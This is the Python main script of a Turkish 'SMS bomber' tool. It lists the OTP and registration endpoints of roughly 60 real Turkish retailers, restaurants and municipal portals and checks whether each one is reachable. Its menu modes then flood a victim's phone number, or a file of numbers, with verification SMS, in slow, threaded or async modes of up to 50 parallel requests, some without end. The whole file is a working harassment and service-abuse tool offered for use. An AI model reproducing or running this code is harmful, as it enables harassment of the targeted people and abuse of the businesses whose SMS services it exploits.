from colorama import Fore, Style
import time
from time import sleep
from os import system
from Scripts.sms import SendSms as SendSmsOld
from Scripts.blastersms import SendSms as SendSmsNew
import requests
import threading
import asyncio
import subprocess
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'Scripts'))

servisler_sms = []
for attribute in dir(SendSmsNew):
    attribute_value = getattr(SendSmsNew, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False and attribute not in ['start', 'check_service_status']:
            servisler_sms.append(attribute)


def check_service_connection(service_name):
    try:
        
        if service_name == "KahveDunyasi":
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": "5554443322"}
            r = requests.post(url, headers=headers, json=json, timeout=3)
            return r.status_code == 200
            
        elif service_name == "Wmf":
            url = "https://www.wmf.com.tr/users/register/"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Bim":
            url = "https://bim.veesk.net:443/service/v1.0/account/login"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Englishhome":
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            r = requests.get("https://www.englishhome.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Suiste":
            url = "https://suiste.com:443/api/auth/code"
            r = requests.get("https://suiste.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "KimGb":
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Evidea":
            url = "https://www.evidea.com:443/users/register/"
            r = requests.get("https://www.evidea.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Ucdortbes":
            url = "https://api.345dijital.com:443/api/users/register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "TiklaGelsin":
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Naosstars":
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            r = requests.get("https://api.naosstars.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Koton":
            url = "https://www.koton.com:443/users/register/"
            r = requests.get("https://www.koton.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Hayatsu":
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            r = requests.get("https://www.hayatsu.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Hizliecza":
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Metro":
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "File":
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Akasya":
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Akbati":
            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Komagene":
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            r = requests.get("https://www.komagene.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Porty":
            url = "https://panel.porty.tech:443/api.php?"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Tasdelen":
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Uysal":
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Yapp":
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "YilmazTicaret":
            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Beefull":
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Dominos":
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Baydoner":
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Pidem":
            url = "https://restashop.azurewebsites.net:443/graphql/"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Frink":
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Bodrum":
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "KofteciYusuf":
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Little":
            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Orwi":
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Coffy":
            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Hamidiye":
            url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Fatih":
            url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet"
            r = requests.get("https://ebelediye.fatih.bel.tr", timeout=3, verify=False)
            return r.status_code < 500
            
        elif service_name == "Sancaktepe":
            url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
            r = requests.get("https://e-belediye.sancaktepe.bel.tr", timeout=3, verify=False)
            return r.status_code < 500
            
        elif service_name == "Bayrampasa":
            url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet"
            r = requests.get("https://ebelediye.bayrampasa.bel.tr", timeout=3, verify=False)
            return r.status_code < 500
            
        elif service_name == "Money":
            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
            r = requests.get("https://www.money.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Alixavien":
            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
            r = requests.get("https://www.alixavien.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Jimmykey":
            url = "https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms"
            r = requests.get("https://www.jimmykey.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Ido":
            url = "https://api.ido.com.tr:443/idows/v2/register"
            r = requests.get("https://www.ido.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Tazi":
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Hey":
            url = "https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Bisu":
            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Macro":
            url = "https://www.macrocenter.com.tr:443/rest/users/register/otp"
            r = requests.get("https://www.macrocenter.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Ayyildiz":
            url = "https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Istegelsin":
            url = "https://prod.fasapi.net:443/"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Ipragaz":
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Qumpara":
            url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Paybol":
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Migros":
            url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Joker":
            url = "https://api.joker.com.tr:443/api/register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Clickme":
            url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Happy":
            url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
            r = requests.get("https://www.happy.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "KuryemGelsin":
            url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Taksim":
            url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Tasimacim":
            url = "https://server.tasimacim.com/requestcode"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "ToptanTeslim":
            url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
            r = requests.get("https://toptanteslim.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Yuffi":
            url = "https://api.yuffi.co/api/parent/login/user"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Starbucks":
            url = "https://auth.sbuxtr.com:443/signUp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500

        
        return False
        
    except Exception as e:
        return False
art = r"""
  ____                      _  _    ___   ___  
 |  _ \ _   _ _______ _   _| || |  ( _ ) / _ \ 
 | | | | | | |_  / __| | | | || |_ / _ \| | | |
 | |_| | |_| |/ / (__| |_| |__   _| (_) | |_| |
 |____/ \__,_/___\___|\__,_|  |_|  \___/ \___/ 
 / ___| _ __ ___  ___                          
 \___ \| '_ ` _ \/ __|                         
  ___) | | | | | \__ \                         
 |____/|_| |_| |_|___/   
"""

blink_messages = [
    "!! Sadece Türkiye Numaralari !!",
    "!! Turkish Phone Numbers Only !!"
]

def check_all_services():
    system("cls||clear")
    print(f"{Fore.LIGHTCYAN_EX}Servis Durumları Kontrol Ediliyor...{Style.RESET_ALL}\n")
    
    active_services = 0
    total_services = len(servisler_sms)
    
    for service_name in servisler_sms:
        if service_name not in ["check_service_status", "__init__"]:
            try:
                status = check_service_connection(service_name)
                if status:
                    print(f"{Fore.LIGHTGREEN_EX}[AÇIK] {Style.RESET_ALL}{service_name}")
                    active_services += 1
                else:
                    print(f"{Fore.LIGHTRED_EX}[KAPALI] {Style.RESET_ALL}{service_name}")
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[HATA] {Style.RESET_ALL}{service_name}")
    
    print(f"\n{Fore.LIGHTCYAN_EX}Toplam: {active_services}/{total_services} servis aktif{Style.RESET_ALL}")
    print(f"\n{Fore.LIGHTYELLOW_EX}Menüye dönmek için 'enter' tuşuna basınız...{Style.RESET_ALL}")
    input()

async def main():
    while True:
        system("cls||clear")
        
        print(f"""
{Fore.BLUE +  Style.BRIGHT + Style.DIM + art + Style.RESET_ALL}
{Fore.RED + Style.BRIGHT} !! Sadece Türkiye Numaralari !! {Style.RESET_ALL}
{Fore.CYAN}╔══════════════════════════════════╗
{Fore.CYAN}║    {Fore.YELLOW}🚀 SMS BOMBER v3.0 {Fore.CYAN}           ║
{Fore.CYAN}╠══════════════════════════════════╣
{Fore.WHITE}║  {Fore.GREEN}1.{Style.RESET_ALL} 📱 Yavaş Sms                 {Fore.CYAN}║ 
{Fore.WHITE}║  {Fore.GREEN}2.{Style.RESET_ALL} ⚡ Normal Sms                {Fore.CYAN}║
{Fore.WHITE}║  {Fore.BLUE}3.{Style.RESET_ALL} {Fore.LIGHTBLUE_EX}{Style.BRIGHT}🚀 Sms-Blaster (DAHA HIZLI)  {Style.RESET_ALL}{Fore.CYAN}║
{Fore.WHITE}║  {Fore.GREEN}4.{Style.RESET_ALL} 📊 Servis Kontrol            {Fore.CYAN}║
{Fore.WHITE}║  {Fore.YELLOW}5.{Style.RESET_ALL} ⚖️  Hız Karşılaştırma         {Fore.CYAN}║
{Fore.WHITE}║  {Fore.RED}0.{Style.RESET_ALL} ❌ Çıkış                     {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════╝
{Fore.LIGHTBLUE_EX + Style.BRIGHT} Sms : 238
{Fore.LIGHTRED_EX + Style.BRIGHT} İnstagram/Github : Duzcu480
{Style.RESET_ALL}""", end="")
        
        print("\n" + Fore.LIGHTYELLOW_EX + "Seçiminiz: "+ Fore.LIGHTGREEN_EX, end="")
        sys.stdout.flush()

        async def blink_banner():
            texts = [
                f"{Fore.RED}{Style.BRIGHT} !! Turkish Phone Numbers Only !! {Style.RESET_ALL}",
                f"{Fore.RED}{Style.BRIGHT} !! Sadece Türkiye Numaralari !! {Style.RESET_ALL}"
            ]
            lang_idx = 0
            while True:
                for _ in range(3):
                    sys.stdout.write(f"\033[s\033[14A\r\033[K{texts[lang_idx]}\033[u")
                    sys.stdout.flush()
                    await asyncio.sleep(0.8)
                    
                    sys.stdout.write(f"\033[s\033[14A\r\033[K\033[u")
                    sys.stdout.flush()
                    await asyncio.sleep(0.8)
                
                lang_idx = (lang_idx + 1) % 2
        blink_task = asyncio.create_task(blink_banner())

        try:
            menu_input = await asyncio.to_thread(input)
        finally:
            blink_task.cancel()

        if menu_input == "":
            continue
            
        try:
            menu = int(menu_input)
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
            await asyncio.sleep(3)
            continue
            
        if menu == 1:
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
            tel_no = input()
            tel_liste = []
            if tel_no == "":
                system("cls||clear")
                print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+ Fore.LIGHTGREEN_EX, end="")
                dizin = input()
                try:
                    with open(dizin, "r", encoding="utf-8") as f:
                        for i in f.read().strip().split("\n"):
                            if len(i) == 10:
                                tel_liste.append(i)
                    sonsuz = ""
                except FileNotFoundError:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
                    sleep(3)
                    continue
            else:
                try:
                    int(tel_no)
                    if len(tel_no) != 10:
                        raise ValueError
                    tel_liste.append(tel_no)
                    sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"
                except ValueError:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")
                    sleep(3)
                    continue
            system("cls||clear")
            try:
                print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
                mail = input()
                if ("@" not in mail or ".com" not in mail) and mail != "":
                    raise
            except:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.")
                sleep(3)
                continue
            system("cls||clear")
            try:
                print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
                kere = input()
                if kere:
                    kere = int(kere)
                else:
                    kere = None
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
                sleep(3)
                continue
            system("cls||clear")
            try:
                print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
                aralik = int(input())
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
                sleep(3)
                continue
            system("cls||clear")
            if kere is None:
                sms = SendSmsOld(tel_no, mail)
                while True:
                    for attribute in dir(SendSmsOld):
                        attribute_value = getattr(SendSmsOld, attribute)
                        if callable(attribute_value):
                            if attribute.startswith('__') == False:
                                exec("sms."+attribute+"()")
                                sleep(aralik)
            for i in tel_liste:
                sms = SendSmsOld(i, mail)
                if isinstance(kere, int):
                        while sms.adet < kere:
                            for attribute in dir(SendSmsOld):
                                attribute_value = getattr(SendSmsOld, attribute)
                                if callable(attribute_value):
                                    if attribute.startswith('__') == False:
                                        if sms.adet == kere:
                                            break
                                        exec("sms."+attribute+"()")
                                        sleep(aralik)
            print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
            input()
        elif menu == 0:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
            break
        elif menu == 2:
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
            tel_no = input()
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")
                sleep(3)
                continue
            system("cls||clear")
            try:
                print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
                mail = input()
                if ("@" not in mail or ".com" not in mail) and mail != "":
                    raise
            except:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.")
                sleep(3)
                continue
            system("cls||clear")
            send_sms = SendSmsOld(tel_no, mail)
            dur = threading.Event()

            def Turbo():
                while not dur.is_set():
                    thread = []
                    for fonk in servisler_sms:
                        if fonk not in ["check_service_status", "__init__", "adet", "phone", "mail", "tc"]:
                            try:
                                t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                                thread.append(t)
                                t.start()
                            except Exception:
                                continue
                    for t in thread:
                        t.join()

            try:
                Turbo()
            except KeyboardInterrupt:
                dur.set()
                system("cls||clear")
                print(f"\n{Fore.LIGHTRED_EX}Durduruldu! Menüye dönülüyor...{Style.RESET_ALL}")
                sleep(2)
        elif menu == 3:
            system("cls||clear")
            print(Fore.LIGHTBLUE_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
            tel_no = input()
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")
                sleep(3)
                continue
                
            system("cls||clear")
            try:
                print(Fore.LIGHTBLUE_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
                mail = input()
                if ("@" not in mail or ".com" not in mail) and mail != "":
                    raise
            except:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.")
                sleep(3)
                continue

            system("cls||clear")
            print(f"""
{Fore.CYAN}╔════════════════════════════════════════╗
{Fore.CYAN}║         {Fore.YELLOW}⚡ HIZ SEÇENEKLERİ ⚡{Fore.CYAN}          ║
{Fore.CYAN}╠════════════════════════════════════════╣
{Fore.WHITE}║ {Fore.GREEN}1 -{Style.RESET_ALL} Hızlı Paralellik (15)              {Fore.CYAN}║
{Fore.WHITE}║ {Fore.LIGHTBLUE_EX + Style.BRIGHT}2 - Maximum Paralellik (50){Style.RESET_ALL}            {Fore.CYAN}║
{Fore.CYAN}╚════════════════════════════════════════╝
            """)
            print(Fore.LIGHTYELLOW_EX + "Hız Seçiminiz: " + Fore.LIGHTGREEN_EX, end="")
            hiz_secim = input()
            
            if hiz_secim == "1":
                concurrency = 15
            elif hiz_secim == "2":
                concurrency = 50
            else:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Geçersiz seçim! Standart hız (15) seçildi.")
                concurrency = 15
                sleep(2)

            system("cls||clear")
            try:
                sms = SendSmsNew(tel_no, mail)
                await sms.start(999999, concurrency)
            except KeyboardInterrupt:
                system("cls||clear")
                print(f"\n{Fore.LIGHTRED_EX}Durduruldu! Menüye dönülüyor...{Style.RESET_ALL}")
                sleep(2)
            except Exception as exc:
                system("cls||clear")
                print(f"{Fore.LIGHTRED_EX}Bir hata oluştu: {exc}{Style.RESET_ALL}")
                sleep(2)
        elif menu == 4:
            check_all_services()
        elif menu == 5:
            from random import randint
            tel_no = "5055050555"
            mail = "testduzcu" + str(randint(1000,9999)) + "@gmail.com"
            test_sure = 8

            system("cls||clear")
            print(f"{Fore.CYAN}Turbo Mod (Threading) testi başlıyor...{Style.RESET_ALL}")
            import time
            time.sleep(2)
            start_time = time.time()
            send_sms = SendSmsOld(tel_no, mail)
            dur = threading.Event()

            def Turbo():
                while not dur.is_set():
                    thread = []
                    for fonk in servisler_sms:
                        if fonk not in ["check_service_status", "__init__", "adet", "phone", "mail", "tc"]:
                            t = threading.Thread(target=getattr(send_sms, fonk))
                            thread.append(t)
                            t.start()
                    for t in thread:
                        t.join()

            turbo_thread = threading.Thread(target=Turbo)
            turbo_thread.daemon = True
            turbo_thread.start()
            time.sleep(test_sure)
            dur.set()
            turbo_time = time.time() - start_time
            turbo_adet = send_sms.adet

            system("cls||clear")
            print(f"{Fore.CYAN}Blaster Mod (Async) testi başlıyor...{Style.RESET_ALL}")
            time.sleep(2)
            start_time = time.time()
            sms = SendSmsNew(tel_no, mail)
            try:
                await asyncio.wait_for(sms.start(999999, 50), timeout=test_sure)
            except asyncio.TimeoutError:
                pass
            except KeyboardInterrupt:
                pass
            blaster_time = time.time() - start_time
            blaster_adet = sms.adet

            system("cls||clear")
            print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════╗
{Fore.CYAN}║        {Fore.YELLOW}⚖️ KARŞILAŞTIRMA SONUÇLARI ⚖️{Fore.CYAN}           ║
{Fore.CYAN}╠══════════════════════════════════════════════╝
{Fore.CYAN}║ Turbo Mod (Threading): {turbo_adet} SMS / {turbo_time:.2f} sn     
{Fore.CYAN}║ Blaster Mod (Async): {blaster_adet} SMS / {blaster_time:.2f} sn    
{Fore.CYAN}╚═══════════════════════════════════════════════
            """)
            if blaster_adet > turbo_adet:
                print(f"{Fore.LIGHTGREEN_EX}Blaster Mod daha hızlı!{Style.RESET_ALL}")
            elif turbo_adet > blaster_adet:
                print(f"{Fore.LIGHTRED_EX}Turbo Mod daha hızlı!{Style.RESET_ALL}")
            else:
                print(f"{Fore.LIGHTYELLOW_EX}Her iki mod eşit!{Style.RESET_ALL}")
            print(f"\n{Fore.LIGHTYELLOW_EX}Menüye dönmek için 'enter' tuşuna basınız...{Style.RESET_ALL}")
            input()
        elif menu == 0:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
            break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        system("cls||clear")
        print(f"\n{Fore.LIGHTRED_EX}Program sonlandırıldı.{Style.RESET_ALL}")
